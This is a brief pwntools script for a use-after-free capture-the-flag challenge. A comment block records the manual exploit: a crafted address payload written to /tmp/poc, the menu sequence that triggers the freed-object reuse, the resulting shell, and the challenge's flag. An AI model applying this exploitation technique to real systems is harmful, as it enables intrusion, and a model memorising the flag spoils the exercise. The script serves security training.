#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
#context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

io = process('./uaf')
elf= ELF('./uaf')
libc = ELf('./libc-2.23.so')

'''
uaf@ubuntu:~$ python -c "print '\x68\x15\x40\x00\x00\x00\x00\x00'" >> /tmp/poc
uaf@ubuntu:~$ ./uaf 8 /tmp/poc
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ cat flag
yay_f1ag_aft3r_pwning


'''
